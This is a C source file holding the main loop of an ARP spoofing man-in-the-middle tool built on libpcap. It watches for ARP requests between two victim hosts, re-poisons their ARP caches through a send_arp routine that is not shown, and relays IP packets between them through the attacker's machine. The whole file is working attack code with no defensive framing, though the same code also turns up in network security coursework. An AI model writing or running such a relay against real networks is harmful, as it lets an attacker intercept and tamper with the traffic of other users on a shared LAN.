#include "arp_spoofing.h"

void arp_spoofing(pcap_t *handle, struct network_pack *attacker, struct network_pack *sender, struct network_pack *target)
{
	struct pcap_pkthdr *header;
	const u_char *packet;
	int state = 0;
	struct ether_header *ether;
	struct ether_arp *arp;
	struct ip *ipv4;

	while(1)
	{
		state = pcap_next_ex(handle, &header, &packet);
		if (state < 1)
			continue;
		ether = (struct ether_header *)packet;

		//ARP PACKET- > RE-INFECTION//
		if(ntohs(ether->ether_type) == ETHERTYPE_ARP)
		{
			arp = (struct ether_arp *)(packet + 14);

			//CHECK SENDER'S ARP REQUEST//
			if(memcmp(&sender->ip, arp->arp_spa, sizeof(struct in_addr)) == 0)
			{
				if(memcmp(&target->ip, arp->arp_tpa, sizeof(struct in_addr)) == 0)
				{
					send_arp(handle, attacker, target, sender);
					printf("SENDER WILL BE RE-INFECTED\n\n");
				}
			}

			//CHECK TARGET'S ARP REQUEST//
			if(memcmp(&target->ip, arp->arp_spa, sizeof(struct in_addr)) == 0)
			{
				if(memcmp(&sender->ip, arp->arp_tpa, sizeof(struct in_addr)) == 0)
				{
					send_arp(handle, attacker, sender, target);
					printf("TARGET WILL BE RE-INFECTED\n\n");
				}
			}
		}
		//IP PACKET -> RELAY//
		else if(ntohs(ether->ether_type) == ETHERTYPE_IP)
		{
			ipv4 = (struct ip *)(packet + 14);

			//RELAY SENDER -> ATTACKER -> TARGET//
			if(memcmp(ether->ether_shost, &sender->mac, ETHER_ADDR_LEN) == 0)
			{
				if(memcmp(ether->ether_dhost, &attacker->mac, ETHER_ADDR_LEN) == 0)
				{
					if(memcmp(&ipv4->ip_dst, &target->ip, sizeof(struct in_addr)) != 0)
					{
						memcpy(&ether->ether_shost, &attacker->mac, ETHER_ADDR_LEN);
						memcpy(&ether->ether_dhost, &target->mac, ETHER_ADDR_LEN);

						if(pcap_sendpacket(handle, packet, header->caplen) == -1)
							printf("RELAY ERROR : SENDER -> ATTACKER -> TARGET\n\n");
						else
							printf("RELAY OK : SENDER -> ATTACKER -> TARGET\n\n");
					}
				}
			}
			//RELAY FROM TARGET -> ATTACKER -> SENDER//
			if(memcmp(ether->ether_shost, &target->mac, ETHER_ADDR_LEN) == 0)
			{
				if(memcmp(ether->ether_dhost, &attacker->mac, ETHER_ADDR_LEN) == 0)
				{
					if(memcmp(&ipv4->ip_dst, &sender->ip, sizeof(struct in_addr)) != 0)
					{
						memcpy(&ether->ether_shost, &attacker->mac, ETHER_ADDR_LEN);
						memcpy(&ether->ether_dhost, &sender->mac, ETHER_ADDR_LEN);

						if(pcap_sendpacket(handle, packet, header->caplen) == -1)
							printf("RELAY ERROR : TARGET -> ATTACKER -> SENDER\n\n");
						else
							printf("RELAY OK : TARGET -> ATTACKER -> SENDER\n\n");
					}
				}
			}
		}
	}
}